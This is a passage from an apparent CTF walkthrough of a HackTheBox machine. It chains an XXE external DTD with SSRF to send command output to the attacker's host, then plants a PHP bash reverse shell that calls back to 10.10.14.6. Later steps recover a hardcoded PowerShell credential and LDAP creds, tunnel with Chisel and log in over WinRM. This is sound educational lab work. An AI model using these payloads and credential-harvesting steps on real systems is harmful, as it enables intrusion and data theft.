10:37:37.353385 IP 10.10.14.6 > 10.10.10.62: ICMP echo reply, id 1, seq 1, length 64

```

#### RCE with Results

Before going for a shell, I’m curious if I can get results of commands this way. I’ll chain this SSRF with the DTD exfil I used above.

The request is:

```

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.6/0xdf.dtd">
<data>&send;</data>

```

The new DTD file that will load is:

```

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:4/?page=http://10.10.14.6/0xdf">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/?%file;'>">
%all;

```

That will set the `file` variable to the base64-encoded result of the SSRF, and send a request to my server with the results as the parameter.

I’ll leave `0xdf.php` as the PHP that pings my host so if I don’t get results, seeing if I got pings or not will help me figure out where it broke.

On sending, there’s a request for the DTD, immediately followed by `0xdf.php`, and then pings at `tcpdump` (not shown) and a result:

```
10.10.10.62 - - [30/Apr/2022 10:37:37] "GET /0xdf2.dtd HTTP/1.0" 200 -
10.10.10.62 - - [30/Apr/2022 10:37:37] "GET /0xdf.php HTTP/1.0" 200 -
10.10.10.62 - - [30/Apr/2022 10:37:37] "GET /?UElORyAxMC4xMC4xNC42ICgxMC4xMC4xNC42KSA1Nig4NCkgYnl0ZXMgb2YgZGF0YS4KNjQgYnl0ZXMgZnJvbSAxMC4xMC4xNC42OiBpY21wX3NlcT0xIHR0bD02MyB0aW1lPTg4LjggbXMKCi0tLSAxMC4xMC4xNC42IHBpbmcgc3RhdGlzdGljcyAtLS0KMSBwYWNrZXRzIHRyYW5zbWl0dGVkLCAxIHJlY2VpdmVkLCAwJSBwYWNrZXQgbG9zcywgdGltZSAwbXMKcnR0IG1pbi9hdmcvbWF4L21kZXYgPSA4OC44MTYvODguODE2Lzg4LjgxNi8wLjAwMCBtcwoK HTTP/1.0" 200 -

```

The parameter decodes to:

```

oxdf@hacky$ echo "UElORyAxMC4xMC4xNC42ICgxMC4xMC4xNC42KSA1Nig4NCkgYnl0ZXMgb2YgZGF0YS4KNjQgYnl0ZXMgZnJvbSAxMC4xMC4xNC42OiBpY21wX3NlcT0xIHR0bD02MyB0aW1lPTg4LjggbXMKCi0tLSAxMC4xMC4xNC42IHBpbmcgc3RhdGlzdGljcyAtLS0KMSBwYWNrZXRzIHRyYW5zbWl0dGVkLCAxIHJlY2VpdmVkLCAwJSBwYWNrZXQgbG9zcywgdGltZSAwbXMKcnR0IG1pbi9hdmcvbWF4L21kZXYgPSA4OC44MTYvODguODE2Lzg4LjgxNi8wLjAwMCBtcwoK" | base64 -d
PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
64 bytes from 10.10.14.6: icmp_seq=1 ttl=63 time=88.8 ms
--- 10.10.14.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 88.816/88.816/88.816/0.000 ms

```

#### Shell

I could update the Python script above to manage this RCE, but I’m going to just go for a reverse shell at this point.

I’ll update `0xdf.php` to:

```

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"); ?>

```

And then send either the blind or not blind requests above. A shell comes back to a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.62 60018
bash: cannot set terminal process group (817): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fulcrum:~/uploads$

```

I’ll upgrade my shell:

```

www-data@fulcrum:~/uploads$ script /dev/null -c bash
Script started, file is /dev/null
www-data@fulcrum:~/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@fulcrum:~/uploads$ 

```

## Shell as WebUser [webserver]

### Enumeration

#### Virtualization

There are no directories in `/home`, and www-data’s home directory is `/var/www`.

Looking at the `ifconfig` output, there’s another NIC on this host, `virbr0`:

```

www-data@fulcrum:/$ ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.62  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:d692  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:d692  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:d6:92  txqueuelen 1000  (Ethernet)
        RX packets 1413593  bytes 180939826 (180.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1477001  bytes 662814996 (662.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 380661  bytes 27232656 (27.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 380661  bytes 27232656 (27.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:86:b0:95  txqueuelen 1000  (Ethernet)
        RX packets 937990  bytes 384677551 (384.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1237809  bytes 102258170 (102.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...[snip]...

```

`virbr0` is “Virtual Bridge 0”, and interface [used with](https://askubuntu.com/questions/246343/what-is-the-virbr0-interface-used-for) `libvirt`. This interface has the IPv4 of 192.168.122.1/24.

Looking at the process list, it looks like there are three QEMU VMs running:

```

www-data@fulcrum:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
libvirt+    1328 60.7 25.0 2964572 1524032 ?     Sl   10:56  11:25 /usr/bin/qemu-system-x86_64 -name guest=WEB01,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-1-WEB01/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid fa6eaeb1-64c2-4196-8879-32a78fdffdc8 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=30,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/WEB01.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=32,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f4,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5900,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...
libvirt+    1484 46.5 28.5 2984048 1735264 ?     Rl   10:56   8:42 /usr/bin/qemu-system-x86_64 -name guest=FILE,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-2-FILE/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid bfabe8f5-334f-4df9-9a4a-5886cc223ce8 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=31,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/FILE.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=33,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f3,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5901,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...
libvirt+    1522 47.8 30.1 2998496 1835668 ?     Sl   10:56   8:54 /usr/bin/qemu-system-x86_64 -name guest=DC,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-3-DC/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid f04d92d5-9597-488b-8224-4f0f97f7e089 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=32,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/DC.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=34,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f2,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5902,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...

```
*Note: Looking at my notes from 2018, there were four VMs, but the firewall VM is no longer there.*

Looking at the arguments for each of these `qemu` processes, it seems the VMs are named `DC`, `FILE`, and `WEB01`.

#### Network Enum

`arp` shows IP addresses for three other hosts on the 192.168.122.0/24 network:

```

www-data@fulcrum:~/uploads$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.122.130          ether   52:54:00:9e:52:f2   C                     virbr0
192.168.122.132          ether   52:54:00:9e:52:f3   C                     virbr0
10.10.10.2               ether   00:50:56:b4:85:0a   C                     ens160
192.168.122.228          ether   52:54:00:9e:52:f4   C                     virbr0

```

A ping sweep finds only the .228 host.

```

www-data@fulcrum:~/uploads$ for i in {1..254}; do (ping -c 1 192.168.122.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from 192.168.122.228: icmp_seq=1 ttl=128 time=0.526 ms

```

I’ll upload a [static compiled](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) `nmap` to Fulcrum and scan:

```

www-data@fulcrum:/dev/shm$ ./nmap -sT -Pn -p- --min-rate 10000 192.168.122.228         

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-05-05 17:12 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.122.228
Host is up (0.021s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 34.71 seconds

```

Without scripts, I can make an educated guess that .228 is `WEB01`.

#### NGINX Conf

`/etc/nginx/sites-enabled/default` shows the five configured webservers.

The three on 88, 4, and 56423 all look the same, just with different `root` and different `listen`. For example, here’s the one for phpMyAdmin:

```

server {                                     
        listen 88;
        root /var/www/pma;
        index index.php index.html index.htm;

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }
}

```

The upload site is on port 4 and in `/var/www/uploads`, and the api site is on port 56423 and in `/var/www/api`.

The server on 9999 just does a redirect to port 80:

```

server {
        listen 9999;

        location / {
                proxy_pass http://localhost/;
        }

}

```

In my old 2018 notes this was pointing at a host on 192.168.122.228, which was the PFSense firewall (that is no longer here).

Port 80 has a proxy to another host:

```

server {                                    
        listen 80 default_server;
        listen [::]:80 default_server;
        
        root /var/www/html;
        
        index index.html index.htm index.nginx-debian.html;
        
        server_name _;
        
        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                proxy_pass http://192.168.122.228:8080/;
        }
...[snip]...

```

Based on the VM names, I’ll guess that’s `WEB01`.

#### /var/www

I did some guessing earlier as to what the contents of `/var/www` might look like. There are actually four folders:

```

www-data@fulcrum:~$ ls
api  html  pma  uploads

```

This matches nicely with what was in the NGINX config.

`api` has `index.php` which just has the XXE vulnerable code I showed above:

```

www-data@fulcrum:~$ ls api/
index.php

```

`pma` has the phpMyAdmin code:

```

www-data@fulcrum:~$ ls pma          
CONTRIBUTING.md         db_events.php            export.php           prefs_forms.php         server_status_advisor.php    tbl_get_field.php          themes
ChangeLog               db_export.php            favicon.ico          prefs_manage.php        server_status_monitor.php    tbl_gis_visualization.php  themes.php
DCO                     db_import.php            gis_data_editor.php  print.css               server_status_processes.php  tbl_import.php             transformation_overview.php
LICENSE                 db_operations.php        import.php           robots.txt              server_status_queries.php    tbl_indexes.php            transformation_wrapper.php
README                  db_qbe.php               import_status.php    schema_export.php       server_status_variables.php  tbl_operations.php         url.php
RELEASE-DATE-4.7.4      db_routines.php          index.php            server_binlog.php       server_user_groups.php       tbl_recent_favorite.php    user_password.php
ajax.php                db_search.php            js                   server_collations.php   server_variables.php         tbl_relation.php           vendor
browse_foreigners.php   db_sql.php               libraries            server_databases.php    show_config_errors.php       tbl_replace.php            version_check.php
changelog.php           db_sql_autocomplete.php  license.php          server_engines.php      sql                          tbl_row_action.php         view_create.php
chk_rel.php             db_sql_format.php        lint.php             server_export.php       sql.php                      tbl_select.php             view_operations.php
composer.json           db_structure.php         locale               server_import.php       tbl_addfield.php             tbl_sql.php
composer.lock           db_tracking.php          logout.php           server_plugins.php      tbl_change.php               tbl_structure.php
config.inc.php          db_triggers.php          navigation.php       server_privileges.php   tbl_chart.php                tbl_tracking.php
db_central_columns.php  doc                      normalization.php    server_replication.php  tbl_create.php               tbl_triggers.php
db_datadict.php         error_report.php         phpinfo.php          server_sql.php          tbl_export.php               tbl_zoom_select.php
db_designer.php         examples                 phpmyadmin.css.php   server_status.php       tbl_find_replace.php         templates

```

There is no evidence of any MySQL service running on this box. The `config.inc.php` file looks to be default template, and not completed:

```

...[snip]...
/**                                                                    
 * This is needed for cookie based authentication to encrypt password in
 * cookie. Needs to be 32 chars long.
 */                            
$cfg['blowfish_secret'] = ''; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! */
                                                                               
/**                                   
 * Servers configuration                                            
 */                             
$i = 0;                                                        
                                                                               
/**                      
 * First server                                                                
 */
$i++;
/* Authentication type */
$cfg['Servers'][$i]['auth_type'] = 'cookie';
/* Server parameters */
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['compress'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
...[snip]...

```

`html` is the default directory, and empty.

`uploads` has the files I found already, plus one more:

```

www-data@fulcrum:~$ ls uploads/
Fulcrum_Upload_to_Corp.ps1  home.php  index.php  upload.php

```

`Fulcrum_Upload_to_Corp.ps` is interesting. It has creds for the WebUser user on a remote Windows host:

```

# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1

```

### Shell over WinRM

#### Decrypt Password

I could jump over to a Windows VM, but I’ll just user PowerShell on my Linux VM (installed via [these instructions](https://docs.microsoft.com/en-us/powershell/scripting/install/install-ubuntu?view=powershell-7.2)).

The script creates a `PSCredential` object. I can just copy those same lines into my terminal to get the object:

```

oxdf@hacky$ pwsh
PowerShell 7.2.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /> $1 = 'WebUser'
PS /> $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
PS /> $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
PS /> $4 = $3 | ConvertTo-SecureString -key $2
PS /> $5 = New-Object System.Management.Automation.PSCredential ($1, $4)
PS /> $5

UserName                     Password
--------                     --------
WebUser  System.Security.SecureString

```

Getting the plaintext password from a `PSCredential` object is not hard at all (I did similar in [Reel](/2018/11/10/htb-reel.html#privesc-nico---tom) and [Omni](/2021/01/09/htb-omni.html#enumeration-1)):

```

PS /> $5.GetNetworkCredential() | fl

UserName       : WebUser
Password       : M4ng£m£ntPa55
SecurePassword : System.Security.SecureString
Domain         :

```

#### Tunneling

I’ll upload [Chisel](https://github.com/jpillora/chisel) to Fulcrum using `wget` and a Python webserver on my host. I’ll start the server on my host:

```

oxdf@hacky$ ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2022/04/30 16:34:05 server: Reverse tunnelling enabled
2022/04/30 16:34:05 server: Fingerprint ELDNCi88AXOsB1lq2iNOOqXaFFUdqm5/OsUYO83mDeQ=
2022/04/30 16:34:05 server: Listening on http://0.0.0.0:8000

```

On Fulcrum, I’ll connect as a client:

```

www-data@fulcrum:/dev/shm$ chmod +x chisel_1.7.6_linux_amd64 
www-data@fulcrum:/dev/shm$ ./chisel_1.7.6_linux_amd64 client 10.10.14.6:8000 R:socks
2022/04/30 12:34:45 client: Connecting to ws://10.10.14.6:8000
2022/04/30 12:34:46 client: Connected (Latency 95.865413ms)

```

Now I have a SOCKS proxy listening on my host on port 1080, and forwarding everything through Fulcrum.

I’ll make sure that `/etc/proxychains4.conf` is set to use it:

```

oxdf@hacky$ cat /etc/proxychains4.conf 
...[snip]...
[ProxyList]
socks5  127.0.0.1 1080

```

#### Evil-WinRM

The script was using PowerShell remoting to run a command, so I’ll try to connect with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to the webserver which was listening on 5985:

```

oxdf@hacky$ proxychains evil-winrm -i 192.168.122.228 -u WebUser -p M4ng£m£ntPa55
                                                               
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.122.228:5985  ...  OK
*Evil-WinRM* PS C:\Users\WebUser\Documents>

```

As I continue doing stuff over ProxyChains for the rest of this post, the debug lines starting with `[proxychains]` will print. I’ll can disable those in the config and reconnect.

## Shell as btables [file]

### Enumeration

There’s nothing in the user’s home directory, so I’ll pivot to the webroot.

```
*Evil-WinRM* PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/16/2022  11:33 PM            703 iisstart.htm
-a----        2/16/2022  11:33 PM          99710 iisstart.png
-a----        2/12/2022  11:42 PM           5252 index.htm
-a----        2/12/2022  11:42 PM           1280 web.config

```

`C:\inetpub\wwwroot\index.htm` has the error message I got originally on port 80, just hardcoded in HTML. `iisstart.html` and `iisstart.png` are the default IIS page and image.

`web.config` is the [file that configures IIS](https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-6.0). This one has a couple interesting sections. The bottom defines what pages could get loaded on the default `/`:

```

        <defaultDocument>
            <files>
                <clear />
                <add value="Default.asp" />
                <add value="Default.htm" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>

```

At the top is defines a LDAP connection to the DC, including creds:

```

    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>

```

### LDAP

#### Raw PowerShell LDAP Background

Given the name of the account and the comments above, it seems like a good idea to query the active directory domain. To query LDAP from PowerShell, I’ll need a `DirectoryEntry` object. These objects are referenced as `System.DirectoryServices.DirectoryEntry`, or `ADSI`. There are several constructors (ways to create an object), but I’ll use [this one](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.-ctor?view=dotnet-plat-ext-6.0#system-directoryservices-directoryentry-ctor(system-string-system-string-system-string)) because it allows me to pass the username and password.

```
*Evil-WinRM* PS C:\> $adsi = New-Object ADSI("LDAP://dc.fulcrum.local", "fulcrum\ldap", "PasswordForSearching123!")

```

Next I’ll create an `ADSISearcher` (short for `System.DirectoryServices.DirectorySearcher`, documented [here](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-5.0)), using this constructor:

```

public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot, string filter);

```

For example, I’ll search for users:

```
*Evil-WinRM* PS C:\> $searcher = New-Object ADSISearcher($adsi, "(&(objectClass=user))")

```

Now to actually execute the search, I’ll use `FindOne` or `FindAll` on the resulting `$searcher` object. For example:

```
*Evil-WinRM* PS C:\Users\WebUser\Documents> $searcher.FindOne()

Path                                                                  Properties
----                                                                  ----------
LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local {logoncount, codepage, objectcategory, description...}

```

It’s returned an object related to the Administrator account, with a `Path` and `Properties`. I can show those Properties in more detail:

```
*Evil-WinRM* PS C:\inetpub\wwwroot> $searcher.FindOne() | %{ $_.Properties }

Name                           Value
----                           -----
logoncount                     {5}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local}
description                    {Built-in account for administering the computer/domain}
usnchanged                     {12846}
instancetype                   {4}
name                           {Administrator}
badpasswordtime                {132962343309228048}
pwdlastset                     {132962343593582079}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {132962317999839687}
usncreated                     {8196}
objectguid                     {12 72 120 26 38 229 14 68 153 143 45 96 205 131 232 127}
memberof                       {CN=Group Policy Creator Owners,CN=Users,DC=fulcrum,DC=local, CN=Domain Admins,CN=Users,DC=fulcrum,DC=local, CN=Enterprise Admins,CN=Users,DC=fulcrum,DC=local, CN=Schema Admins,CN=Users,DC=fulcrum,DC=local...}
whencreated                    {5/5/2022 1:39:39 PM}
adspath                        {LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local}
useraccountcontrol             {512}
cn                             {Administrator}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {5/5/2022 2:25:59 PM}
dscorepropagationdata          {5/5/2022 1:57:45 PM, 5/5/2022 1:57:45 PM, 5/5/2022 1:42:36 PM, 1/1/1601 6:12:16 PM}
lastlogon                      {132962344102366307}
distinguishedname              {CN=Administrator,CN=Users,DC=fulcrum,DC=local}
logonhours                     {255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255}
admincount                     {1}
iscriticalsystemobject         {True}
samaccountname                 {Administrator}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 216 239 5 69 222 106 231 38 26 113 214 180 244 1 0 0}
lastlogoff                     {0}
accountexpires                 {0}

```

#### Enum with Raw PowerShell

There are eight users:

```
*Evil-WinRM* PS C:\> ($searcher.FindAll() | measure-object).count
8

```

I could just dump them all and scroll through. A common thing to look for (especially in CTFs) is something with the comments (or `info`) set. There’s only one of those:

```
*Evil-WinRM* PS C:\> $searcher = New-Object ADSISearcher($adsi, "(&(objectClass=user)(info=*))")
